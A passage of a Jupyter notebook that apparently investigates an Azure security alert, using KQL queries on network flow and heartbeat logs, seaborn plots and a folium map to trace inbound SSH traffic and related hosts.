CAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBTaW5nYXBvcmUsIFNpbmdhcG9yZSwgcHJvdG9jb2w9c3NoYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfYTk1ODFmMjY4YjM5NGY3YjlkYzM3MmU4NWU2NzE4YmMgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzEuMjkzMSwgMTAzLjg1NThdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl81ZmRkZTU2ZGY5NTU0YjljODljYTlhYTA1YzYzZDg2OSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAncHVycGxlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2E5NTgxZjI2OGIzOTRmN2I5ZGMzNzJlODVlNjcxOGJjLnNldEljb24oaWNvbl81ZmRkZTU2ZGY5NTU0YjljODljYTlhYTA1YzYzZDg2OSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF81NDY5OWZhZTcwMmE0OTg1YjkwZTNmYzNkNmZkYTBlYSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sX2Q2NTY3MGMyOWIzNTRmNzJhOTcyNzY3YTIwODJkYzVlID0gJChgPGRpdiBpZD0iaHRtbF9kNjU2NzBjMjliMzU0ZjcyYTk3Mjc2N2EyMDgyZGM1ZSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9U0csIENvdW50cnlOYW1lPVNpbmdhcG9yZSwgU3RhdGU9Q2VudHJhbCBTaW5nYXBvcmUgQ29tbXVuaXR5IERldmVsb3BtZW50IENvdW5jaWwsIENpdHk9U2luZ2Fwb3JlLCBMb25naXR1ZGU9MTAzLjg1NTgsIExhdGl0dWRlPTEuMjkzMTxicj4xMy42Ny4zNS4xNzY8YnI+cHJvdG9jb2w9c3NoPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF81NDY5OWZhZTcwMmE0OTg1YjkwZTNmYzNkNmZkYTBlYS5zZXRDb250ZW50KGh0bWxfZDY1NjcwYzI5YjM1NGY3MmE5NzI3NjdhMjA4MmRjNWUpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9hOTU4MWYyNjhiMzk0ZjdiOWRjMzcyZTg1ZTY3MThiYy5iaW5kUG9wdXAocG9wdXBfNTQ2OTlmYWU3MDJhNDk4NWI5MGUzZmMzZDZmZGEwZWEpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2E5NTgxZjI2OGIzOTRmN2I5ZGMzNzJlODVlNjcxOGJjLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFNpbmdhcG9yZSwgU2luZ2Fwb3JlLCBwcm90b2NvbD1zc2hgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl83YTM1N2Y3OGMxNzE0YTVmOWRmMjM4ZDZlM2Q1MjlmYSA9IEwubWFya2VyKAogICAgICAgICAgICBbMS4yOTMxLCAxMDMuODU1OF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzRiZTU4MjU3MDE2MTQ0NWQ5ZjM2NDg2OThjZjhjNmU1ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdwdXJwbGUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfN2EzNTdmNzhjMTcxNGE1ZjlkZjIzOGQ2ZTNkNTI5ZmEuc2V0SWNvbihpY29uXzRiZTU4MjU3MDE2MTQ0NWQ5ZjM2NDg2OThjZjhjNmU1KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzI0YzMyMTU0NWI4NDQwZTlhNzZhYjRkMTU0YjU2ZDZmID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfMDUzOWViMWZjYWY2NDUwODllYWU0MDhhN2Q5MzAyZGYgPSAkKGA8ZGl2IGlkPSJodG1sXzA1MzllYjFmY2FmNjQ1MDg5ZWFlNDA4YTdkOTMwMmRmIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1TRywgQ291bnRyeU5hbWU9U2luZ2Fwb3JlLCBTdGF0ZT1DZW50cmFsIFNpbmdhcG9yZSBDb21tdW5pdHkgRGV2ZWxvcG1lbnQgQ291bmNpbCwgQ2l0eT1TaW5nYXBvcmUsIExvbmdpdHVkZT0xMDMuODU1OCwgTGF0aXR1ZGU9MS4yOTMxPGJyPjIzLjk3LjYwLjIxNDxicj5wcm90b2NvbD1zc2g8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzI0YzMyMTU0NWI4NDQwZTlhNzZhYjRkMTU0YjU2ZDZmLnNldENvbnRlbnQoaHRtbF8wNTM5ZWIxZmNhZjY0NTA4OWVhZTQwOGE3ZDkzMDJkZik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzdhMzU3Zjc4YzE3MTRhNWY5ZGYyMzhkNmUzZDUyOWZhLmJpbmRQb3B1cChwb3B1cF8yNGMzMjE1NDViODQ0MGU5YTc2YWI0ZDE1NGI1NmQ2ZikKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfN2EzNTdmNzhjMTcxNGE1ZjlkZjIzOGQ2ZTNkNTI5ZmEuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgU2luZ2Fwb3JlLCBTaW5nYXBvcmUsIHByb3RvY29sPXNzaGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2NiNDE2YjRiMGNhNjRlMDhhMzQ3ZjZmNzRiNjk1YTc2ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFsxLjI5MzEsIDEwMy44NTU4XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fMjU4YzliZGIwMjIyNDg3NDhiYzZhZjg5ZjU4MGY1N2IgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ3B1cnBsZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl9jYjQxNmI0YjBjYTY0ZTA4YTM0N2Y2Zjc0YjY5NWE3Ni5zZXRJY29uKGljb25fMjU4YzliZGIwMjIyNDg3NDhiYzZhZjg5ZjU4MGY1N2IpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfM2FmMDYzY2Q3NjkyNDhkMDljMGI3YzY4M2IxNWRiZTMgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF8xODFiN2Y1NzU0MDA0ZDkyODViNTI0ODAwZGI3OTdiNyA9ICQoYDxkaXYgaWQ9Imh0bWxfMTgxYjdmNTc1NDAwNGQ5Mjg1YjUyNDgwMGRiNzk3YjciIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVNHLCBDb3VudHJ5TmFtZT1TaW5nYXBvcmUsIFN0YXRlPUNlbnRyYWwgU2luZ2Fwb3JlIENvbW11bml0eSBEZXZlbG9wbWVudCBDb3VuY2lsLCBDaXR5PVNpbmdhcG9yZSwgTG9uZ2l0dWRlPTEwMy44NTU4LCBMYXRpdHVkZT0xLjI5MzE8YnI+MjMuOTcuNjAuMjE0PGJyPnByb3RvY29sPXNzaDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfM2FmMDYzY2Q3NjkyNDhkMDljMGI3YzY4M2IxNWRiZTMuc2V0Q29udGVudChodG1sXzE4MWI3ZjU3NTQwMDRkOTI4NWI1MjQ4MDBkYjc5N2I3KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfY2I0MTZiNGIwY2E2NGUwOGEzNDdmNmY3NGI2OTVhNzYuYmluZFBvcHVwKHBvcHVwXzNhZjA2M2NkNzY5MjQ4ZDA5YzBiN2M2ODNiMTVkYmUzKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl9jYjQxNmI0YjBjYTY0ZTA4YTM0N2Y2Zjc0YjY5NWE3Ni5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBTaW5nYXBvcmUsIFNpbmdhcG9yZSwgcHJvdG9jb2w9c3NoYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKPC9zY3JpcHQ+\" style=\"position:absolute;width:100%;height:100%;left:0;top:0;border:none !important;\" allowfullscreen webkitallowfullscreen mozallowfullscreen></iframe></div></div>"
      ],
      "text/plain": [
       "<folium.folium.Map at 0x261deacae80>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "<p style=\"color:red\">Warning: the folium mapping library does not display correctly in some browsers.</p><br>If you see a blank image please retry with a different browser."
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 720x360 with 2 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 812.35x360 with 2 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "from datetime import timedelta\n",
    "import folium\n",
    "from folium.plugins import MarkerCluster\n",
    "from numbers import Number\n",
    "import warnings\n",
    "\n",
    "host_entities = [e for e in security_alert.entities if isinstance(e, mas.Host)]\n",
    "if len(host_entities) == 1:\n",
    "    alert_host_entity = host_entities[0]\n",
    "    host_name = alert_host_entity.HostName\n",
    "    resource = alert_host_entity.AzureID\n",
    "else:\n",
    "    host_name = None\n",
    "    alert_host_entity = None\n",
    "    print('Error: Could not determine host entity from alert.')\n",
    "\n",
    "\n",
    "def create_ip_map():\n",
    "    folium_map = folium.Map(zoom_start=7, tiles=None, width='100%', height='100%')\n",
    "    folium_map.add_tile_layer(name='IPEvents')\n",
    "    return folium_map\n",
    "\n",
    "def add_ip_cluster(folium_map, ip_entities, alert=None, **icon_props):\n",
    "    if not folium_map:\n",
    "        folium_map = create_ip_map()\n",
    "    \n",
    "    for ip_entity in ip_entities:\n",
    "        if not (isinstance(ip_entity.Location.Latitude, Number) and\n",
    "                isinstance(ip_entity.Location.Longitude, Number)):\n",
    "            warnings.warn(\"Invalid location information for IP: \" + ip_entity.Address,\n",
    "                          RuntimeWarning)\n",
    "            continue\n",
    "        loc_props = ', '.join([f'{key}={val}' for key, val in \n",
    "                               ip_entity.Location.properties.items() if val])\n",
    "        popup_text = \"{loc_props}<br>{IP}\".format(IP=ip_entity.Address,\n",
    "                                                  loc_props=loc_props)\n",
    "        tooltip_text = '{City}, {CountryName}'.format(**ip_entity.Location.properties)\n",
    "        if alert:\n",
    "            popup_text = f'{popup_text}<br>{alert.AlertName}'\n",
    "        if ip_entity.AdditionalData:\n",
    "            addl_props = ', '.join([f'{key}={val}' for key, val in \n",
    "                                    ip_entity.AdditionalData.items() if val])\n",
    "            popup_text = f'{popup_text}<br>{addl_props}'\n",
    "            tooltip_text = f'{tooltip_text}, {addl_props}'\n",
    "        marker = folium.Marker(\n",
    "            location = [ip_entity.Location.Latitude, ip_entity.Location.Longitude],\n",
    "            popup=popup_text,\n",
    "            tooltip=tooltip_text,\n",
    "            icon=folium.Icon(**icon_props)\n",
    "        )\n",
    "        marker.add_to(folium_map)\n",
    "\n",
    "    return folium_map\n",
    "\n",
    "print('Looking for IP addresses of ', host_name)\n",
    "aznet_query = '''\n",
    "AzureNetworkAnalytics_CL \n",
    "| where VirtualMachine_s has \\'{host}\\'\n",
    "| where ResourceType == 'NetworkInterface'\n",
    "| top 1 by TimeGenerated desc\n",
    "| project PrivateIPAddresses = PrivateIPAddresses_s, \n",
    "    PublicIPAddresses = PublicIPAddresses_s\n",
    "'''.format(host=host_name)\n",
    "%kql -query aznet_query\n",
    "az_net_df = _kql_raw_result_.to_dataframe()\n",
    "\n",
    "\n",
    "oms_heartbeat_query = '''\n",
    "Heartbeat\n",
    "| where Computer has \\'{host}\\'\n",
    "| top 1 by TimeGenerated desc nulls last\n",
    "| project ComputerIP, OSType, OSMajorVersion, OSMinorVersion, ResourceId, RemoteIPCountry, \n",
    "RemoteIPLatitude, RemoteIPLongitude, SourceComputerId\n",
    "'''.format(host=host_name)\n",
    "%kql -query oms_heartbeat_query\n",
    "oms_heartbeat_df = _kql_raw_result_.to_dataframe()\n",
    "#display(oms_heartbeat_df[['ComputerIP']])\n",
    "#display(az_net_df)\n",
    "\n",
    "print('getting data...')\n",
    "# Get the host entity and add this IP and system info to the \n",
    "try:\n",
    "    if not inv_host_entity:\n",
    "        inv_host_entity = mas.Host()\n",
    "        inv_host_entity.HostName = host_name\n",
    "except NameError:\n",
    "    inv_host_entity = mas.Host()\n",
    "    inv_host_entity.HostName = host_name\n",
    "\n",
    "def convert_to_ip_entities(ip_str):\n",
    "    ip_entities = []\n",
    "    if ip_str:\n",
    "        if ',' in ip_str:\n",
    "            addrs = ip_str.split(',')\n",
    "        elif ' ' in ip_str:\n",
    "            addrs = ip_str.split(' ')\n",
    "        else:\n",
    "            addrs = [ip_str]\n",
    "        for addr in addrs:\n",
    "            ip_entity = mas.IpAddress()\n",
    "            ip_entity.Address = addr.strip()\n",
    "            iplocation.lookup_ip(ip_entity=ip_entity)\n",
    "            ip_entities.append(ip_entity)\n",
    "            print(addr)\n",
    "    return ip_entities\n",
    "\n",
    "# Add this information to our inv_host_entity\n",
    "if len(az_net_df) == 1:\n",
    "    priv_addr_str = az_net_df['PrivateIPAddresses'].loc[0]\n",
    "    inv_host_entity.properties['private_ips'] = convert_to_ip_entities(priv_addr_str)\n",
    "\n",
    "    pub_addr_str = az_net_df['PublicIPAddresses'].loc[0]\n",
    "    inv_host_entity.properties['public_ips'] = convert_to_ip_entities(pub_addr_str)\n",
    "\n",
    "retrieved_address = [ip.Address for ip in inv_host_entity.properties['public_ips']]\n",
    "if len(oms_heartbeat_df) == 1:\n",
    "    if oms_heartbeat_df['ComputerIP'].loc[0]:\n",
    "        oms_address = oms_heartbeat_df['ComputerIP'].loc[0]\n",
    "        if oms_address not in retrieved_address:\n",
    "            ip_entity = mas.IpAddress()\n",
    "            ip_entity.Address = oms_address\n",
    "            iplocation.lookup_ip(ip_entity=ip_entity)\n",
    "            inv_host_entity.properties['public_ips'].append(ip_entity)\n",
    "        \n",
    "    inv_host_entity.OSFamily = oms_heartbeat_df['OSType'].loc[0]\n",
    "    inv_host_entity.AdditionalData['OSMajorVersion'] = oms_heartbeat_df['OSMajorVersion'].loc[0]\n",
    "    inv_host_entity.AdditionalData['OSMinorVersion'] = oms_heartbeat_df['OSMinorVersion'].loc[0]\n",
    "    inv_host_entity.AdditionalData['SourceComputerId'] = oms_heartbeat_df['SourceComputerId'].loc[0]\n",
    "\n",
    "# print('Updated Host Entity\\n')\n",
    "# print(inv_host_entity)\n",
    "\n",
    "display(Markdown('### Flow Time and Protocol Distribution'))\n",
    "# Azure Network Analytics Base Query\n",
    "az_net_analytics_query =r'''\n",
    "AzureNetworkAnalytics_CL \n",
    "| where SubType_s == 'FlowLog'\n",
    "| where FlowStartTime_t >= datetime({start})\n",
    "| where FlowEndTime_t <= datetime({end})\n",
    "| project TenantId, TimeGenerated, \n",
    "    FlowStartTime = FlowStartTime_t, \n",
    "    FlowEndTime = FlowEndTime_t, \n",
    "    FlowIntervalEndTime = FlowIntervalEndTime_t, \n",
    "    FlowType = FlowType_s,\n",
    "    ResourceGroup = split(VM_s, '/')[0],\n",
    "    VMName = split(VM_s, '/')[1],\n",
    "    VMIPAddress = VMIP_s, \n",
    "    PublicIPs = extractall(@\"([\\d\\.]+)[|\\d]+\", dynamic([1]), PublicIPs_s),\n",
    "    SrcIP = SrcIP_s,\n",
    "    DestIP = DestIP_s,\n",
    "    ExtIP = iif(FlowDirection_s == 'I', SrcIP_s, DestIP_s),\n",
    "    L4Protocol = L4Protocol_s, \n",
    "    L7Protocol = L7Protocol_s, \n",
    "    DestPort = DestPort_d, \n",
    "    FlowDirection = FlowDirection_s,\n",
    "    AllowedOutFlows = AllowedOutFlows_d, \n",
    "    AllowedInFlows = AllowedInFlows_d,\n",
    "    DeniedInFlows = DeniedInFlows_d, \n",
    "    DeniedOutFlows = DeniedOutFlows_d,\n",
    "    RemoteRegion = AzureRegion_s,\n",
    "    VMRegion = Region_s\n",
    "| extend AllExtIPs = iif(isempty(PublicIPs), pack_array(ExtIP), \n",
    "                         iif(isempty(ExtIP), PublicIPs, array_concat(PublicIPs, pack_array(ExtIP)))\n",
    "                         )\n",
    "| project-away ExtIP\n",
    "| mvexpand AllExtIPs\n",
    "{where_clause}\n",
    "'''\n",
    "\n",
    "start = security_alert.StartTimeUtc - timedelta(seconds=(10 * 60 * 60))\n",
    "end = security_alert.StartTimeUtc + timedelta(seconds=(5 * 60 * 60))\n",
    "\n",
    "\n",
    "### Flow Time and Protocol Distribution\n",
    "\n",
    "all_alert_host_ips = inv_host_entity.private_ips + inv_host_entity.public_ips\n",
    "host_ips = {'\\'{}\\''.format(i.Address) for i in all_alert_host_ips}\n",
    "alert_host_ip_list = ','.join(host_ips)\n",
    "\n",
    "az_ip_where = f'''\n",
    "| where (VMIPAddress in ({alert_host_ip_list}) \n",
    "        or SrcIP in ({alert_host_ip_list}) \n",
    "        or DestIP in ({alert_host_ip_list}) \n",
    "        ) and \n",
    "    (AllowedOutFlows > 0 or AllowedInFlows > 0)'''\n",
    "print('getting data...', end=' ')\n",
    "az_net_query_byip = az_net_analytics_query.format(where_clause=az_ip_where,\n",
    "                                                  start=start,\n",
    "                                                  end=end)\n",
    "\n",
    "net_default_cols = ['FlowStartTime', 'FlowEndTime', 'VMName', 'VMIPAddress', \n",
    "                'PublicIPs', 'SrcIP', 'DestIP', 'L4Protocol', 'L7Protocol',\n",
    "                'DestPort', 'FlowDirection', 'AllowedOutFlows', \n",
    "                'AllowedInFlows']\n",
    "\n",
    "%kql -query az_net_query_byip\n",
    "az_net_comms_df = _kql_raw_result_.to_dataframe()\n",
    "print('done')\n",
    "\n",
    "import warnings\n",
    "\n",
    "with warnings.catch_warnings():\n",
    "    warnings.simplefilter(\"ignore\")\n",
    "    \n",
    "    az_net_comms_df['TotalAllowedFlows'] = az_net_comms_df['AllowedOutFlows'] + az_net_comms_df['AllowedInFlows']\n",
    "    sns.catplot(x=\"L7Protocol\", y=\"TotalAllowedFlows\", col=\"FlowDirection\", data=az_net_comms_df)\n",
    "    sns.relplot(x=\"FlowStartTime\", y=\"TotalAllowedFlows\", \n",
    "                col=\"FlowDirection\", kind=\"line\", \n",
    "                hue=\"L7Protocol\", data=az_net_comms_df).set_xticklabels(rotation=50)\n",
    "\n",
    "\n",
    "nbdisp.display_timeline(data=az_net_comms_df.query('AllowedOutFlows > 0'),\n",
    "                         overlay_data=az_net_comms_df.query('AllowedInFlows > 0'),\n",
    "                         alert=security_alert, title='Network Flows (out=blue, in=green)',\n",
    "                         time_column='FlowStartTime',\n",
    "                         source_columns=['FlowType', 'AllExtIPs', 'L7Protocol', 'FlowDirection'],\n",
    "                         height=300)\n",
    "\n",
    "display(Markdown('### GeoLocation Mapping for external IPs'))\n",
    "ip_locs_in = set()\n",
    "ip_locs_out = set()\n",
    "for _, row in az_net_comms_df.iterrows():\n",
    "    ip = row.AllExtIPs\n",
    "\n",
    "    if ip in ip_locs_in or ip in ip_locs_out or not ip:\n",
    "        continue\n",
    "    ip_entity = mas.IpAddress(Address=ip)\n",
    "    iplocation.lookup_ip(ip_entity=ip_entity)\n",
    "    if not ip_entity.Location:\n",
    "        continue\n",
    "    ip_entity.AdditionalData['protocol'] = row.L7Protocol\n",
    "    if row.FlowDirection == 'I':\n",
    "        ip_locs_in.add(ip_entity)\n",
    "    else:\n",
    "        ip_locs_out.add(ip_entity)\n",
    "\n",
    "flow_map = create_ip_map()\n",
    "display(HTML('<h3>External IP Addresses communicating with host</h3>'))\n",
    "display(HTML('Numbered circles indicate multiple items - click to expand'))\n",
    "display(HTML('Location markers: Blue = outbound, Purple = inbound, Green = Host'))\n",
    "\n",
    "icon_props = {'color': 'green'}\n",
    "flow_map = add_ip_cluster(folium_map=flow_map,\n",
    "                            ip_entities=inv_host_entity.public_ips,\n",
    "                            **icon_props)\n",
    "icon_props = {'color': 'blue'}\n",
    "flow_map = add_ip_cluster(folium_map=flow_map,\n",
    "                            ip_entities=ip_locs_out,\n",
    "                            **icon_props)\n",
    "icon_props = {'color': 'purple'}\n",
    "flow_map = add_ip_cluster(folium_map=flow_map,\n",
    "                            ip_entities=ip_locs_in,\n",
    "                            **icon_props)\n",
    "\n",
    "display(flow_map)\n",
    "display(Markdown('<p style=\"color:red\">Warning: the folium mapping library '\n",
    "                 'does not display correctly in some browsers.</p><br>'\n",
    "                 'If you see a blank image please retry with a different browser.'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Observations\n",
    "- We can the relatively rare ssh inbound traffic and view the connections on a timeline.\n",
    "- We can also see the originating location of the source IP Address (in purple)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id='other_hosts_to_ips'></a>[Contents](#toc)\n",
    "## Have any other hosts been communicating with this address(es)?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "getting data...\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "#### 1 unseen IP Address found in this data: ['10.0.3.5']"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Found New Host Entity msticalertswin1\n",
      "\n",
      "{ 'HostName': 'msticalertswin1',\n",
      "  'Type': 'host',\n",
      "  'private_ips': [{\"Address\": \"10.0.3.5\", \"Type\": \"ipaddress\"}],\n",
      "  'public_ips': [ {\"Address\": \"40.76.43.124\", \"Location\": {\"CountryCode\": \"US\", \"CountryName\": \"United States\", \"State\": \"Virginia\", \"City\": \"Washington\", \"Longitude\": -78.1704, \"Latitude\": 38.7163, \"Type\": \"geolocation\"}, \"Type\": \"ipaddress\"}]}\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 720x720 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from datetime import timedelta\n",
    "\n",
    "alert_ips = {'\\'{}\\''.format(i.Address) for i in alert_ip_entities}\n",
    "alert_host_ip_list = ','.join(alert_ips)\n",
    "\n",
    "az_ip_where = f'| where AllExtIPs in ({alert_host_ip_list})'\n",
    "\n",
    "az_net_query_by_pub_ip = az_net_analytics_query.format(where_clause=az_ip_where,\n",
    "                                                       start = security_alert.StartTimeUtc - timedelta(3),\n",
    "                                                       end = security_alert.StartTimeUtc + timedelta(1))\n",
    "print('getting data...')\n",
    "%kql -query az_net_query_by_pub_ip\n",
    "az_net_ext_comms_df = _kql_raw_result_.to_dataframe()\n",
    "#az_net_ext_comms_df[net_default_cols]\n",
    "\n",
    "# az_net_ext_comms_df.groupby(['VMName', 'L7Protocol'])['AllowedOutFlows','AllowedInFlows','DeniedInFlows','DeniedOutFlows'].sum()\n",
    "\n",
    "\n",
    "\n",
    "inv_host_ips = [ent.Address for ent in inv_host_entity.private_ips]\n",
    "inv_host_ips += [ent.Address for ent in inv_host_entity.public_ips]\n",
    "\n",
    "alert_ips = [ip.Address for ip in alert_ip_entities]\n",
    "\n",
    "known_ips = inv_host_ips + alert_ips\n",
    "\n",
    "# Ips can be in one of 4 columns!\n",
    "def find_new_ips(known_ips, row):\n",
    "    new_ips = set()\n",
    "    if row.VMIPAddress and row.VMIPAddress not in known_ips:\n",
    "        new_ips.add(row.VMIPAddress)\n",
    "    if row.SrcIP and row.SrcIP not in known_ips:\n",
    "        new_ips.add(row.SrcIP)\n",
    "    if row.DestIP and row.DestIP not in known_ips:\n",
    "        new_ips.add(row.DestIP)\n",
    "    if row.PublicIPs:\n",
    "        for pub_ip in row.PublicIPs:\n",
    "            if pub_ip not in known_ips:\n",
    "                new_ips.add(pub_ip)\n",
    "    if new_ips:            \n",
    "        return list(new_ips)\n",
    "\n",
    "new_ips_all = az_net_ext_comms_df.apply(lambda x: find_new_ips(known_ips, x), axis=1).dropna()\n",
    "new_ips = set()\n",
    "for ip in [ip for item in new_ips_all for ip in item]:\n",
    "    new_ips.add(ip)\n",
    "display(Markdown(f'#### {len(new_ips)} unseen IP Address found in this data: {list(new_ips)}'))\n",
    "\n",
    "\n",
    "\n",
    "vm_ip = new_ips.pop()\n",
    "aznet_query = '''\n",
    "AzureNetworkAnalytics_CL \n",
    "| where PrivateIPAddresses_s has \\'{vm_ip}\\'\n",
    "| where ResourceType == 'NetworkInterface'\n",
    "| top 1 by TimeGenerated desc\n",
    "| project PrivateIPAddresses = PrivateIPAddresses_s, \n",
    "    PublicIPAddresses = PublicIPAddresses_s,\n",
    "    VirtualMachine = VirtualMachine_s\n",
    "| extend Host = split(VirtualMachine, '/')[-1]\n",
    "'''.format(vm_ip=vm_ip)\n",
    "%kql -query aznet_query\n",
    "az_net_df = _kql_raw_result_.to_dataframe()\n",
    "if len(az_net_df) > 0:\n",
    "    host_name = az_net_df['Host'].at[0]\n",
    "\n",
    "oms_heartbeat_query = '''\n",
    "Heartbeat\n",
    "| where ComputerIP == \\'{vm_ip}\\'\n",
    "| top 1 by TimeGenerated desc nulls last\n",
    "| project Computer, ComputerIP, OSType, OSMajorVersion, OSMinorVersion, ResourceId, RemoteIPCountry, \n",
    "RemoteIPLatitude, RemoteIPLongitude, SourceComputerId\n",
    "'''.format(vm_ip=vm_ip)\n",
    "%kql -query oms_heartbeat_query\n",
    "oms_heartbeat_df = _kql_raw_result_.to_dataframe()\n",
